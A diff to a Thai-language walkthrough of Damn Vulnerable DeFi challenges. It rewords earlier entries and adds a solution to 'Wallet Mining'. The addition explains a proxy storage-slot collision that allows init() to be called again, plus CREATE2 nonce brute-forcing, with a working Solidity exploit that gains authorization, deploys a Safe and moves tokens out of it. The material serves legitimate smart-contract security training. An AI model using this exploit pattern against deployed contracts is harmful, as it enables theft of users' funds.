@@ -17,7 +17,7 @@ by tinamints
 
 ## 2. Naive Receiver
 ### เงื่อนไข :
-- กู้คืนเงินทั้งหมดใน pool
+- กู้คืนสินทรัพย์ทั้งหมดใน pool
 - ทำให้เสร็จภายใน 2 ทรานแซกชัน
 ### คอนเซ็ป :
 -  แฟลชโลน
@@ -48,7 +48,7 @@ by tinamints
 
 ## 3. Truster
 ### เงื่อนไข :
-- กู้คืนเงินทั้งหมดไปยัง recovery
+- กู้คืนสินทรัพย์ทั้งหมดไปยัง recovery
 - ทำให้เสร็จใน 1 tx
 ### คอนเซ็ป :
 -  แฟลชโลน
@@ -81,13 +81,13 @@ by tinamints
 
 ## 5. The Rewarder
 ### เงื่อนไข :
-- กู้คืนเงินให้ได้มากที่สุดไปยัง recovery
+- กู้คืนสินทรัพย์ให้ได้มากที่สุดไปยัง recovery
 - ต้องอยู่ใน beneficiaries เพื่อโต้ตอบกับ distributor
 ### คอนเซ็ป :
 -  การแจกจ่ายแบบจำกัดสิทธิ์
 -  ระบบมาร์เคิลทรี
 ### วิธีแก้ :
-- ใช้ประโยชน์จากการที่ `claimRewards()` ไม่ทำเครื่องหมายการเรียกร้องว่าใช้แล้ว จึงสามารถเรียกร้องโทเคนเดิมซ้ำหลายครั้งในการเรียกเดียวเพื่อดึงเงินทั้งหมด
+- ใช้ประโยชน์จากการที่ `claimRewards()` ไม่ทำเครื่องหมายการเรียกร้องว่าใช้แล้ว จึงสามารถเรียกร้องโทเคนเดิมซ้ำหลายครั้งในการเรียกเดียวเพื่อดึงสินทรัพย์ทั้งหมด
 ### POC
 ` function test_theRewarder() public checkSolvedByPlayer {
         
@@ -300,3 +300,83 @@ by tinamints
         attackContract.attack(address(maliciousImpl));
     }
 `
+
+## 13. Wallet Mining
+### เงื่อนไข :
+- กู้คืน DVT 20M ทั้งหมดจากที่อยู่ฝากเงินของผู้ใช้กลับไปยังผู้ใช้ และจ่ายรางวัลของ wallet deployer ให้กับ ward
+### คอนเซ็ป :
+-  ช่องโหว่ storage slot ชนกันใน upgradeable proxy (การ init ซ้ำ)
+-  การขุดที่อยู่ด้วย CREATE2
+### วิธีแก้ :
+- ตัวแปร `needsInit` ของ `AuthorizerUpgradeable` อยู่ที่ storage slot 0 ซึ่งชนกับที่อยู่ `upgrader` ของ proxy (ซึ่งไม่เป็นศูนย์เสมอ) ทำให้ใครก็ตามเรียก `init()` ซ้ำเพื่อให้สิทธิ์ตัวเองได้ ส่วน `WalletDeployer.drop()` ตรวจสอบแค่ว่าคู่ `(wat, nonce)` ที่เลือกจะ deploy ด้วย CREATE2 ไปตรงกับ `USER_DEPOSIT_ADDRESS` หรือไม่ จึง brute-force หาค่า nonce จนกว่าจะตรงกัน แล้ว deploy Safe จริงที่ตำแหน่งนั้น (โดยมี `user` เป็นเจ้าของ) จากนั้นดึงเงินออกด้วยลายเซ็นของผู้ใช้ผ่าน `execTransaction` และส่งรางวัลของ deployer ให้กับ `ward`
+### POC
+`{
+     // 1. Get authorized
+        getAuthorized(authorizer);
+
+        // 2. Find the nonce
+        bytes memory setupCalldata = _buildSetup(user);
+        uint256 nonce = findNonce(walletDeployer, setupCalldata);
+
+        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
+        //    and pays 1 DVT to this contract (msg.sender)
+        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);
+
+        // 4. Drain the Safe
+        _drainSafe(token, user, userPrivateKey);
+
+        // 5. Forward the reward
+        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
+    }
+
+    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
+    function getAuthorized(address authorizer) internal {
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+        AuthorizerUpgradeable(authorizer).init(wards, aims);
+    }
+
+    function _buildSetup(address user) internal pure returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        return abi.encodeCall(
+            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
+        );
+    }
+
+    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
+    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
+        WalletDeployer wd = WalletDeployer(walletDeployer);
+        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
+        bytes32 initializerHash = keccak256(setupCalldata);
+        address factory = address(wd.cook());
+        for (uint256 n = 0; n < 1000; n++) {
+            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n))
+            , initCodeHash)))));        
+                
+            if (predicted == USER_DEPOSIT_ADDRESS) {
+                console.log("found nonce:", n);
+                return n;
+            }
+        }
+        revert("nonce not found in 0..999");
+    }
+
+    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
+        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
+        bytes memory transferCalldata = abi.encodeCall(
+            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
+        );
+        bytes32 txHash = safe.getTransactionHash(
+            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
+        );
+        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
+        safe.execTransaction(
+            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
+            abi.encodePacked(r, s, v)
+        );
+    }
+`
+
